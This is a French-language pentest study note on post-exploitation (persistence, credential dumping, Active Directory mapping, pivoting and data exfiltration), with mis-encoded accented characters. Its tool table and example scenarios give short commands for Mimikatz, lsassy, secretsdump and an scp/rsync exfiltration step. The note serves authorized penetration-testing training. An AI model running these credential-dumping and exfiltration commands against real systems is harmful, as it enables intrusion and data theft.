
## ğŸ¯ Post-Exploitation

---

## Introduction

La phase de <span class="concept">post-exploitation</span> consiste Ã  tirer profit dâ€™un accÃ¨s Ã©levÃ© (root, SYSTEM, Domain Admin) pour :

- Maintenir un accÃ¨s persistant
- Ã‰tendre son contrÃ´le (latÃ©ral ou vertical)
- Exfiltrer des donnÃ©es sensibles
- PrÃ©parer le reporting final

Cette Ã©tape requiert une grande rigueur : **en pentest pro, il faut minimiser lâ€™impact mÃ©tier**.

---

## Objectifs

- <span class="goal">Maintenir un accÃ¨s durable (persistance)</span>
- <span class="goal">Explorer et extraire des donnÃ©es sensibles</span>
- <span class="goal">Ã‰valuer lâ€™exposition globale du SI</span>

---

## Outils & commandes

| Outil | Exemple & explication |
|-------|-----------------------|
| <span class="technology">Mimikatz</span> | <span class="example">lsadump::lsa /inject /name:</span> â†’ extraction secrets Windows |
| <span class="technology">lsassy</span> | <span class="example">lsassy --hashes</span> â†’ dump credentials |
| <span class="technology">secretsdump.py (Impacket)</span> | <span class="example">impacket-secretsdump target</span> |
| <span class="technology">BloodHound</span> | <span class="example">SharpHound.exe -c All</span> â†’ cartographie de lâ€™environnement AD |
| <span class="technology">CrackMapExec</span> | <span class="example">cme smb target --users</span> |
| <span class="technology">ssh-agent hijack</span> | <span class="example">volatilisation de sessions SSH actives</span> |
| <span class="technology">Rclone</span> | <span class="example">exfiltration discrÃ¨te vers cloud</span> |
| <span class="technology">scp / rsync</span> | <span class="example">exfiltration via SSH contrÃ´lÃ©</span> |
| <span class="technology">Proxychains / Chisel</span> | <span class="example">pivot rÃ©seau vers segments internes</span> |

---

## Techniques principales

| Technique | Exemple |
|-----------|---------|
| <span class="concept">Persistence Windows</span> | scheduled tasks, registry run keys, service install |
| <span class="concept">Persistence Linux</span> | cronjobs, systemd, SSH key implant |
| <span class="concept">Credential dumping</span> | Mimikatz, lsassy, secretsdump |
| <span class="concept">Active Directory mapping</span> | BloodHound |
| <span class="concept">Data exfiltration</span> | Rclone, SCP, rsync |
| <span class="concept">Pivot / tunnel</span> | Chisel, Ligolo, Proxychains |

---

## Bonnes pratiques

- <span class="best-practice">Limiter les traces laissÃ©es sur la cible</span>
- <span class="best-practice">Ne pas exfiltrer de donnÃ©es sensibles rÃ©elles sans accord</span>
- <span class="best-practice">Logger toutes les actions post-exploitation</span>
- <span class="mitigation">En prod : ne jamais activer de persistance permanente</span>
- <span class="best-practice">Toujours vÃ©rifier les autorisations pour lâ€™exfiltration</span>

---

## ğŸ¯ Exemple de scÃ©nario

> <span class="note">ğŸ¯ Cible :</span> Domaine Windows avec accÃ¨s Domain Admin

Actions :
- <span class="technology">secretsdump.py DC</span> â†’ dump de tous les hashes du domaine
- <span class="technology">lsassy</span> â†’ extraction de tokens Admin
- <span class="technology">BloodHound</span> â†’ cartographie des trusts et chemins vers DA
- <span class="technology">Chisel</span> â†’ pivot vers un subnet finance isolÃ©
- <span class="technology">scp *.docx analyst@pivotbox</span> â†’ exfiltration des fichiers sensibles
- Nettoyage des scheduled tasks crÃ©Ã©es

> <span class="note">ğŸ§ Cible :</span> Linux serveur de bases de donnÃ©es

Actions :
- <span class="technology">cronjob implantÃ©</span> â†’ persistence pour retour ultÃ©rieur
- <span class="technology">ssh-agent hijack</span> â†’ rÃ©cupÃ©ration dâ€™accÃ¨s admin
- <span class="technology">rsync</span> â†’ exfiltration contrÃ´lÃ©e des dumps SQL

---

## Cheatlist outils post-exploitation

| Cible | Outils clÃ©s |
|-------|------------|
| Windows | Mimikatz, lsassy, secretsdump, BloodHound, CME |
| Linux | LinPEAS post-exploit, ssh-agent hijack, cron abuse |
| Pivot | Chisel, Ligolo, Proxychains |
| Exfiltration | Rclone, rsync, scp, SMBClient |

---

## ğŸš€ Navigation

- ğŸš€ [[08_Password_Cracking]]
